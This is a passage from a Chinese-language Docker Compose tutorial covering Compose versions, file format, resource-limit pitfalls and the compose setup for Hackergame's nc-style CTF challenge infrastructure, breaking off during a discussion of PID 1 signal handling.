\u200b\u5b98\u65b9\u200b\u63d0\u4f9b\u200b\u7684\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u5bb9\u5668\u200b\u7ec4\u6210\u200b\u7684\u200b\u670d\u52a1\u200b\u7684\u200b\u5de5\u5177\u200b\uff1a\u200b\u7528\u6237\u200b\u7f16\u5199\u200b YAML \u200b\u63cf\u8ff0\u200b\u5982\u4f55\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>docker-compose</code> \u200b\u547d\u4ee4\u200b\u542f\u52a8\u200b\u3001\u200b\u505c\u6b62\u200b\u3001\u200b\u5220\u9664\u200b\u670d\u52a1\u200b\u3002</p> <p>\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u76f4\u89c2\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u4e0b\u9762\u200b\u8fd9\u6837\u200b\u9700\u8981\u200b\u5927\u91cf\u200b\u8bbe\u7f6e\u200b\u73af\u5883\u53d8\u91cf\u200b\u4e0e\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7684\u200b\u7684\u200b\u5355\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>docker run -it --rm \\\n  -e \"DISPLAY=$DISPLAY\" \\\n  -e \"XAUTHORITY=$XAUTHORITY\" \\\n  -v /tmp/.X11-unix:/tmp/.X11-unix \\\n  -v \"$XAUTHORITY:$XAUTHORITY\" \\\n  -v /dev/dri/renderD128:/dev/dri/renderD128 \\\n  -v /run/user/1000/pipewire-0:/run/pipewire/pipewire-0 \\\n  -v /run/user/1000/pulse:/run/pulse/native \\\n  local/example-desktop-1\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u8fd9\u6837\u200b\u5199\u200b\u4e0d\u200b\u76f4\u89c2\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5bb9\u6613\u200b\u51fa\u9519\u200b\uff08\u200b\u5bf9\u4e8e\u200b\u8fd9\u91cc\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u628a\u200b <code>-e</code> \u200b\u548c\u200b <code>-v</code> \u200b\u5199\u200b\u53cd\u200b\u4e86\u200b Docker \u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\u4e0d\u4f1a\u200b\u62a5\u9519\u200b\uff09\u3002\u200b\u800c\u200b\u4f7f\u7528\u200b Docker compose\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u8fd9\u4e9b\u200b\u53c2\u6570\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b <code>docker-compose.yml</code> \u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>version: \"2\"\nservices:\n  desktop:\n    image: local/example-desktop-1\n    environment:\n      - DISPLAY=$DISPLAY\n      - XAUTHORITY=$XAUTHORITY\n    volumes:\n      - /tmp/.X11-unix:/tmp/.X11-unix\n      - $XAUTHORITY:$XAUTHORITY\n      - /dev/dri/renderD128:/dev/dri/renderD128\n      - /run/user/1000/pipewire-0:/run/pipewire/pipewire-0\n      - /run/user/1000/pulse:/run/pulse/native\n</code></pre> <p>\u200b\u7136\u540e\u200b\u8dd1\u200b\u4e00\u4e0b\u200b <code>docker compose up</code>\uff0c\u200b\u5bb9\u5668\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u542f\u52a8\u200b\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u4e0a\u8ff0\u200b\u7684\u200b\u547d\u4ee4\u200b\u6765\u8bb2\u200b\u76f4\u89c2\u200b\u5f97\u200b\u591a\u200b\u4e86\u200b\u3002</p>"},{"location":"ops/virtualization/container/#compose-version","title":"\u7248\u672c","text":"<p>Docker compose \u200b\u6709\u200b v1 \u200b\u548c\u200b v2 \u200b\u4e24\u4e2a\u200b\u7248\u672c\u200b\uff0c\u200b\u800c\u200b\u5176\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08Compose file\uff09\u200b\u5219\u200b\u6709\u200b version 1\uff08\u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b\uff09\u3001version 2\u3001version 3\uff0c\u200b\u4ee5\u53ca\u200b\u6700\u65b0\u200b\u7684\u200b Compose Specification \u200b\u56db\u79cd\u200b\u7248\u672c\u200b\uff0c\u200b\u5bb9\u6613\u200b\u9020\u6210\u200b\u6df7\u4e71\u200b\u3002</p> <p>Docker compose \u200b\u7684\u200b v1 \u200b\u7248\u672c\u200b\uff08\u200b\u57fa\u4e8e\u200b Python\uff09\u200b\u5df2\u7ecf\u200b\u4e8e\u200b 2021 \u200b\u5e74\u200b 5 \u200b\u6708\u200b\u505c\u6b62\u200b\u7ef4\u62a4\u200b\u3002\u200b\u5982\u679c\u200b\u8f93\u51fa\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u662f\u200b v1 \u200b\u7248\u672c\u200b\u7684\u200b compose\uff1a</p> <pre><code>$ docker-compose --version\ndocker-compose version 1.29.2, build unknown\ndocker-py version: 5.0.3\nCPython version: 3.11.2\nOpenSSL version: OpenSSL 3.0.11 19 Sep 2023\n</code></pre> <p>\u200b\u4ece\u200b Docker \u200b\u6e90\u200b\uff08docker-ce\uff09\u200b\u5b89\u88c5\u200b\u7684\u200b <code>docker-compose-plugin</code> \u200b\u5219\u200b\u662f\u200b v2 \u200b\u7248\u672c\u200b\u7684\u200b\uff08\u200b\u57fa\u4e8e\u200b Go \u200b\u8bed\u8a00\u200b\uff09\u3002v2 \u200b\u7248\u672c\u200b\u7684\u200b compose \u200b\u6b64\u65f6\u200b\u4f5c\u4e3a\u200b Docker \u200b\u7684\u200b\u63d2\u4ef6\u200b\uff0c\u200b\u63a8\u8350\u200b\u7684\u200b\u8fd0\u884c\u200b\u65b9\u5f0f\u200b\u662f\u200b <code>docker compose</code>\uff08\u200b\u4e0d\u200b\u542b\u200b\u6a2a\u7ebf\u200b\uff09\uff1a</p> <pre><code>$ docker compose version\nDocker Compose version v2.24.5\n</code></pre> <p>\u200b\u4ece\u200b v1 \u200b\u8fc1\u79fb\u200b\u5230\u200b v2 \u200b\u7684\u200b\u7ec6\u8282\u200b\u95ee\u9898\u200b\u53c2\u89c1\u200b Migrate to Compose V2\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u5bb9\u5668\u200b\u540d\u79f0\u200b\u4e0e\u200b\u73af\u5883\u53d8\u91cf\u200b\u5904\u7406\u200b\u4e0a\u200b\u5b58\u5728\u200b\u5dee\u5f02\u200b\uff09\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0cUbuntu \u200b\u5728\u200b\u5b98\u65b9\u200b\u6e90\u4e2d\u200b\u6253\u5305\u200b\u4e86\u200b <code>docker-compose-v2</code> \u200b\u8fd9\u4e2a\u200b\u5305\u200b\uff0cDebian 13 \u200b\u5b98\u65b9\u200b\u6e90\u200b\u5f00\u59cb\u200b\u63d0\u4f9b\u200b\u7684\u200b <code>docker-compose</code> \u200b\u4e5f\u200b\u662f\u200b v2 \u200b\u7248\u672c\u200b\u7684\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b compose \u200b\u6587\u4ef6\u200b\uff0c\u200b\u65e9\u671f\u200b version 2 \u200b\u4e0e\u200b version 3 \u200b\u7684\u200b\u5171\u5b58\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6df7\u4e71\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u540e\u8005\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4e0e\u200b Docker Swarm\uff08\u200b\u96c6\u7fa4\u200b\u7ba1\u7406\u200b\uff09\u200b\u517c\u5bb9\u200b\u800c\u200b\u8bbe\u8ba1\u200b\u7684\u200b\uff0c\u200b\u4e22\u5f03\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6709\u200b\u610f\u4e49\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u907f\u514d\u200b\u5728\u200b\u975e\u200b swarm \u200b\u96c6\u7fa4\u200b\u573a\u5408\u200b\u4f7f\u7528\u200b version 3 compose \u200b\u6587\u4ef6\u683c\u5f0f\u200b</p> <p>Version 3 \u200b\u683c\u5f0f\u200b\u4ee4\u4eba\u200b\u8bdf\u75c5\u200b\u4e00\u70b9\u200b\u7684\u200b\u662f\u200b\u5176\u200b\u629b\u5f03\u200b\u4e86\u200b\u5bf9\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u6700\u4e3a\u200b\u7cdf\u7cd5\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u4e86\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\uff0cdocker-compose \u200b\u4e0d\u4f1a\u200b\u8f93\u51fa\u200b\u8b66\u544a\u200b\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u5ffd\u7565\u200b\uff1a</p> <p><code>cpu_shares</code>, <code>cpu_quota</code>, <code>cpuset</code>, <code>mem_limit</code>, <code>memswap_limit</code>: These have been replaced by the resources key under <code>deploy</code>. <code>deploy</code> configuration only takes effect when using <code>docker stack deploy</code>, and is ignored by <code>docker-compose</code>.</p> \u200b\u6d4b\u8bd5\u200b\u7528\u200b <code>docker-compose.yml</code> \u200b\u6587\u4ef6\u200b <pre><code>version: '3.8'\nservices:\n  python-app:\n    image: python:3.10-slim\n    command: python -c \"print('Init'); a = [0] * 4000000; print('Array created')\"\n    mem_limit: 16m\n    memswap_limit: 16m\n    environment:\n      - PYTHONUNBUFFERED=1\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fd0\u884c\u200b\u7684\u200b compose \u200b\u73af\u5883\u200b\u652f\u6301\u200b Compose Specification\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u5bb9\u5668\u200b\u4e0d\u4f1a\u200b\u8f93\u51fa\u200b Array created\uff08\u200b\u5728\u200b\u5206\u914d\u5185\u5b58\u200b\u65f6\u5373\u200b\u88ab\u200b\u6740\u6b7b\u200b\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u77e5\u9053\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ea\u4f1a\u200b\u5728\u200b\u5bb9\u5668\u200b\u628a\u200b\u673a\u5668\u200b\u8d44\u6e90\u200b\u8017\u5c3d\u200b\u4e4b\u540e\u200b\u624d\u80fd\u200b\u53d1\u73b0\u200b\u95ee\u9898\u200b\u3002\u200b\u5c31\u200b\u76ee\u524d\u200b\u7684\u200b\u60c5\u51b5\u200b\u800c\u8a00\u200b\uff0c\u200b\u5982\u679c\u200b\u4ecd\u7136\u200b\u6709\u200b\u4f7f\u7528\u200b\u65e7\u7248\u200b docker-compose\uff08\u200b\u4e0d\u200b\u652f\u6301\u200b Compose Specification \u200b\u683c\u5f0f\u200b\uff0c\u200b\u5373\u200b 1.27.0 \u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7248\u672c\u200b\uff09\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b version 2 \u200b\u683c\u5f0f\u200b\u3002\u200b\u76f8\u5173\u200b\u8ba8\u8bba\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\uff1ahttps://github.com/docker/compose/issues/4513\u3002</p> <p>\u200b\u8003\u8651\u200b\u5230\u200b Docker compose v1 \u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u5e76\u4e14\u200b Compose Specification \u200b\u4fdd\u6301\u200b\u4e86\u200b\u5bf9\u200b\u65e7\u7248\u200b compose \u200b\u6587\u4ef6\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0b\u6587\u200b\u4ec5\u200b\u8003\u8651\u200b\u6700\u65b0\u200b\u7684\u200b compose v2 \u200b\u4e0e\u200b Compose Specification \u200b\u6587\u4ef6\u683c\u5f0f\u200b\u3002</p>"},{"location":"ops/virtualization/container/#compose-format-and-usage","title":"\u914d\u7f6e\u6587\u4ef6\u200b\u4e0e\u200b\u57fa\u672c\u200b\u4f7f\u7528","text":"<p>Compose Specification \u200b\u89c4\u5b9a\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u8fd9\u4e9b\u200b \"top-level\" \u200b\u5143\u7d20\u200b\uff1a</p> <ul> <li>Version \u200b\u548c\u200b name</li> <li>Services</li> <li>Network</li> <li>Volumes</li> <li>Configs</li> <li>Secrets</li> </ul> <p>\u200b\u5176\u4e2d\u200b\u524d\u200b\u56db\u9879\u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u3002\u200b\u540c\u65f6\u200b Compose Specification \u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u5199\u200b\u7248\u672c\u53f7\u200b\uff08\u200b\u5df2\u6709\u200b\u7684\u200b\u4f1a\u200b\u88ab\u200b\u5ffd\u7565\u200b\uff09\uff0c\u200b\u800c\u200b\u9879\u76ee\u540d\u79f0\u200b\u4e5f\u200b\u662f\u200b\u53ef\u9009\u200b\u7684\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u5f53\u524d\u76ee\u5f55\u200b\u540d\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u4e2a\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b compose \u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u53ea\u6709\u200b <code>services</code> \u200b\u4e00\u9879\u200b\uff1a</p> <pre><code>services:\n  hello-world:\n    image: hello-world\n</code></pre> <p>\u200b\u5047\u8bbe\u200b\u5f53\u524d\u76ee\u5f55\u200b\u540d\u4e3a\u200b <code>helloworld</code>\uff0c\u200b\u8fd0\u884c\u200b <code>docker compose up</code> \u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b compose \u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b <code>helloworld-hello-world-1</code> \u200b\u7684\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u200b\u5bb9\u5668\u200b\u521b\u5efa\u200b <code>helloworld-hello-world-1</code> \u200b\u7684\u200b bridge \u200b\u7f51\u7edc\u200b\u2014\u2014\u200b\u7531\u4e8e\u200b <code>hello-world</code> \u200b\u7684\u200b\u552f\u4e00\u200b\u529f\u80fd\u200b\u662f\u200b\u8f93\u51fa\u200b\u4e00\u6bb5\u200b\u6587\u5b57\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5bb9\u5668\u200b\u4f1a\u200b\u7acb\u5373\u200b\u9000\u51fa\u200b\u3002</p> <p>\u200b\u5728\u200b\u6d4b\u8bd5\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>docker compose down</code> \u200b\u9500\u6bc1\u200b\u73af\u5883\u200b\uff08\u200b\u5426\u5219\u200b\u5bb9\u5668\u200b\u548c\u200b\u7f51\u7edc\u200b\u4f1a\u200b\u4e00\u76f4\u200b\u5b58\u5728\u200b\uff09\u3002\u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b\u90e8\u5206\u200b\u4f1a\u200b\u5206\u6790\u200b\u4e00\u4e9b\u200b\u4f7f\u7528\u200b Docker compose \u200b\u7684\u200b\u4f8b\u5b50\u200b\u3002</p> <p>\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u6240\u6709\u200b compose \u200b\u73af\u5883\u200b</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker compose ls</code> \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u6240\u6709\u200b\u6253\u5f00\u200b\u7684\u200b compose \u200b\u73af\u5883\u200b\u3002</p>"},{"location":"ops/virtualization/container/#compose-hackergame-nc","title":"\u6848\u4f8b\u200b 1\uff1aHackergame \u200b\u7684\u200b nc \u200b\u7c7b\u200b\u9898\u76ee\u200b Docker \u200b\u5bb9\u5668\u200b\u73af\u5883","text":"<p>Hackergame nc \u200b\u7c7b\u200b\u9898\u76ee\u200b\u7684\u200b Docker \u200b\u5bb9\u5668\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\u3001\u200b\u52a8\u6001\u200b flag\u3001\u200b\u7f51\u9875\u200b\u7ec8\u7aef\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u670d\u52a1\u200b\u3002\u200b\u5176\u4e2d\u200b <code>dynamic_flag</code> \u200b\u7531\u200b xinetd \u200b\u66b4\u9732\u200b\u4e00\u4e2a\u200b TCP \u200b\u7aef\u53e3\u200b\uff0c\u200b\u5728\u200b\u5ba2\u6237\u7aef\u200b\uff08nc\uff09\u200b\u8fde\u63a5\u200b\u65f6\u200b\uff0cxinetd \u200b\u4f1a\u200b\u6267\u884c\u200b <code>front.py</code> \u200b\u811a\u672c\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002\u200b\u811a\u672c\u200b\u4f1a\u200b\u8981\u6c42\u200b\u7528\u6237\u200b\u8f93\u5165\u200b token\uff0c\u200b\u68c0\u67e5\u200b token \u200b\u6709\u6548\u6027\u200b\u4e0e\u200b\u8fde\u63a5\u200b\u9891\u7387\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u9884\u5148\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u89c4\u5219\u200b\u751f\u6210\u200b flag\uff0c\u200b\u521b\u5efa\u200b\u5e76\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\uff0c\u200b\u7531\u200b\u5bf9\u5e94\u200b\u7684\u200b\u9898\u76ee\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u7528\u6237\u200b\u4ea4\u4e92\u200b\u3002\u200b\u9898\u76ee\u200b\u5bb9\u5668\u200b\u5185\u200b\u4e0d\u200b\u9700\u8981\u200b\u505a\u200b\u8bf8\u5982\u200b\u9a8c\u8bc1\u200b token\u3001\u200b\u9650\u5236\u200b\u8d44\u6e90\u200b\u3001\u200b\u5904\u7406\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u7b49\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4e0e\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u6807\u51c6\u200b\u8f93\u5165\u8f93\u51fa\u200b\u4ea4\u4e92\u200b\u5373\u53ef\u200b\u3002\u200b\u800c\u200b <code>web_netcat</code> \u200b\u670d\u52a1\u200b\u5219\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7f51\u9875\u200b\u7ec8\u7aef\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6d4f\u89c8\u5668\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u7f51\u9875\u200b\u4e0a\u200b\u8f93\u5165\u200b\u547d\u4ee4\u200b\u4e0e\u200b <code>dynamic_flag</code> \u200b\u4ea4\u4e92\u200b\u3002</p> <p><code>dynamic_flag</code> \u200b\u7684\u200b <code>docker-compose.yml</code> \u200b\u6587\u4ef6\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>version: '2.4'\nservices:\n  front:\n    build: .\n    ports:\n      - ${port}:2333\n    restart: always\n    read_only: true\n    ipc: shareable\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    ulimits:\n      nofile:\n        soft: 65536\n        hard: 65536\n    environment:\n      - hackergame_conn_interval=${conn_interval}\n      - hackergame_token_timeout=${token_timeout}\n      - hackergame_challenge_timeout=${challenge_timeout}\n      - hackergame_pids_limit=${pids_limit}\n      - hackergame_mem_limit=${mem_limit}\n      - hackergame_flag_path=${flag_path}\n      - hackergame_flag_rule=${flag_rule}\n      - hackergame_challenge_docker_name=${challenge_docker_name}\n      - hackergame_read_only=${read_only}\n      - hackergame_flag_suid=${flag_suid}\n      - hackergame_challenge_network=${challenge_network}\n      - hackergame_shm_exec=${shm_exec}\n      - TZ=Asia/Shanghai\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>build: .</code> \u200b\u8868\u793a\u200b\u4f7f\u7528\u200b\u5f53\u524d\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b Dockerfile \u200b\u6784\u5efa\u200b\u955c\u50cf\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b <code>docker run</code> \u200b\u7684\u200b\u5bf9\u5e94\u200b\u53c2\u6570\u200b\u3002\u200b\u914d\u7f6e\u200b\u4e2d\u5f62\u200b\u5982\u200b <code>${port}</code> \u200b\u7684\u200b\u90e8\u5206\u200b\u88ab\u200b\u79f0\u4e3a\u200b Interpolation\uff0c\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\u2014\u2014\u200b\u8fd9\u91cc\u200b\u66ff\u6362\u200b\u8fd9\u4e9b\u200b\u53d8\u91cf\u200b\u7684\u200b\u503c\u200b\u4f4d\u4e8e\u200b\u540c\u4e00\u200b\u76ee\u5f55\u200b\u7684\u200b <code>.env</code>\uff0c\u200b\u76ee\u524d\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\u4f7f\u7528\u200b\u7684\u200b\u683c\u5f0f\u200b\u5b9a\u4e49\u200b\u53ef\u200b\u53c2\u8003\u200b\u6587\u6863\u200b\u8bf4\u660e\u200b\u3002</p> <p><code>web_netcat</code> \u200b\u7684\u200b <code>docker-compose.yml</code> \u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\uff1a</p> <pre><code>version: '2.4'\nservices:\n  web:\n    build: .\n    ports:\n      - ${web_port}:3000\n    environment:\n      - nc_host=${nc_host}\n      - nc_port=${nc_port}\n      - nc_raw=${nc_raw}\n    restart: always\n    init: true\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>init: true</code> \u200b\u8868\u793a\u200b Docker \u200b\u4f1a\u200b\u5728\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u65f6\u200b\u4f7f\u7528\u200b\u57fa\u4e8e\u200b tini \u200b\u7684\u200b <code>docker-init</code> \u200b\u7ba1\u7406\u200b\u5bb9\u5668\u200b\u5185\u200b\u8fdb\u7a0b\u200b\u3002</p> <p>\u200b\u5bb9\u5668\u200b\u91cc\u200b\u7684\u200b PID 1\uff0c\u200b\u4e0e\u200b\u4fe1\u53f7\u5904\u7406\u200b</p> <p>\u200b\u5728\u200b Unix \u200b\u7cfb\u5217\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e2d\u200b\uff0cPID 1\uff08init\uff09\u200b\u662f\u200b\u6700\u200b\u91cd\u8981\u200b\u7684\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5982\u679c\u200b init \u200b\u9000\u51fa\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u200b\u5c31\u200b\u4f1a\u200b\u5d29\u6e83\u200b\u3002\u200b\u5728\u200b Linux \u200b\u7684\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u91cc\u9762\u200b\u4e5f\u200b\u662f\u200b\u5982\u6b64\u200b\uff0c\u200b\u5982\u679c\u200b\u5176\u4e2d\u200b PID \u200b\u4e3a\u200b 1 \u200b\u7684\u200b\u7a0b\u5e8f\u200b\u9000\u51fa\u200b\uff0c\u200b\u90a3\u4e48\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u91cc\u200b\u7684\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u90fd\u200b\u4f1a\u200b\u6536\u5230\u200b\u5185\u6838\u200b\u53d1\u9001\u200b\u7684\u200b SIGKILL \u200b\u4e00\u8d77\u200b\u966a\u846c\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5bb9\u5668\u200b\u6765\u8bf4\u200b\uff0c\u200b\u9664\u4e86\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\u5b9e\u9645\u200b\u7684\u200b\u670d\u52a1\u7a0b\u5e8f\u200b\u4ee5\u5916\u200b\uff0cPID 1 \u200b\u81f3\u5c11\u200b\u8fd8\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u5904\u7406\u200b\u50f5\u5c38\u200b\u8fdb\u7a0b\u200b\u3002\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7236\u200b\u8fdb\u7a0b\u200b\u7ed3\u675f\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7236\u200b\u8fdb\u7a0b\u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b PID 1\u3002\u200b\u5f53\u8be5\u200b\u8fdb\u7a0b\u200b\u7ed3\u675f\u200b\u4e4b\u540e\u200b\uff0cPID 1 \u200b\u9700\u8981\u200b\u59a5\u5584\u200b\u300c\u200b\u6536\u5c38\u200b\u300d\uff0c\u200b\u5426\u5219\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u4f1a\u200b\u5b58\u5728\u200b\u5927\u91cf\u200b\u7684\u200b\u50f5\u5c38\u200b\u8fdb\u7a0b\u200b\u5360\u7528\u200b\u8d44\u6e90\u200b\u3002</li> <li>\u200b\u4f20\u9012\u200b\u4fe1\u53f7\u200b\u3002PID 1 \u200b\u9700\u8981\u200b\u5c06\u200b <code>SIGTERM</code>\u3001<code>SIGINT</code> \u200b\u7b49\u200b\u4fe1\u53f7\u200b\u8f6c\u53d1\u7ed9\u200b\u5b9e\u9645\u200b\u7684\u200b\u670d\u52a1\u7a0b\u5e8f\u200b\u3002</li> </ol> <p>\u200b\u6839\u636e\u200b tini Issue #8 \u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u5982\u679c\u200b <code>bash</code> \u200b\u4e3a\u200b PID 1\uff0c\u200b\u90a3\u4e48\u200b\u5904\u7406\u200b\u50f5\u5c38\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u4e8b\u60c5\u200b\u786e\u5b9e\u200b\u4e0d\u200b\u9700\u8981\u200b\u64cd\u5fc3\u200b\uff0c\u200b\u4f46\u662f\u200b <code>bash</code> \u200b\u9ed8\u8ba4\u200b\u4e0d\u4f1a\u200b\u5e2e\u5fd9\u200b\u4f20\u9012\u200b\u4fe1\u53f7\u200b\u2014\u2014\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u5982\u679c\u200b\u6267\u884c\u200b <code>docker stop</code>\uff0c\u200b\u90a3\u4e48\u200b <code>bash</code> \u200b\u81ea\u5df1\u200b\u541e\u6389\u200b\u4fe1\u53f7\u200b\u4e4b\u540e\u200b\u4ec0\u4e48\u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u53d1\u751f\u200b\u2014\u2014\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u5361\u4f4f\u200b\u6bd4\u8f83\u200b\u957f\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u76f4\u5230\u200b\u8d85\u65f6\u200b\u4e4b\u540e\u200b\u88ab\u200b\u5f3a\u5236\u200b\u6740\u6b7b\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u505a\u5230\u200b\u4f18\u96c5\u200b\u5730\u200b\u9000\u51fa\u200b\uff08gracefully exit\uff09\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5b9e\u9645\u200b\u7684\u200b\u670d\u52a1\u7a0b\u5e8f\u200b\u4e5f\u200b\u9700\u8981\u200b\u6070\u5f53\u200b\u5904\u7406\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u4f5c\u4e3a\u200b PID 1 \u200b\u7684\u200b\u65f6\u5019\u200b\uff08\u200b\u56e0\u4e3a\u200b PID 1 \u200b\u8fdb\u7a0b\u200b\u4e0d\u50cf\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u6ca1\u6709\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u4fe1\u53f7\u200b handler\uff09\u3002\u200b\u4f8b\u5982\u200b\uff0cPython \u200b\u4e0d\u4f1a\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4f5c\u4e3a\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u8fdb\u7a0b\u200b\uff08PID 1\uff09\u200b\u6536\u5230\u200b <code>SIGTERM</code>\uff08<code>docker stop</code> \u200b\u53d1\u9001\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff09\u200b\u65f6\u200b\uff0c\u200b\u4ec0\u4e48\u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u505a\u200b\uff1a</p> <pre><code>$ sudo docker run -it --rm 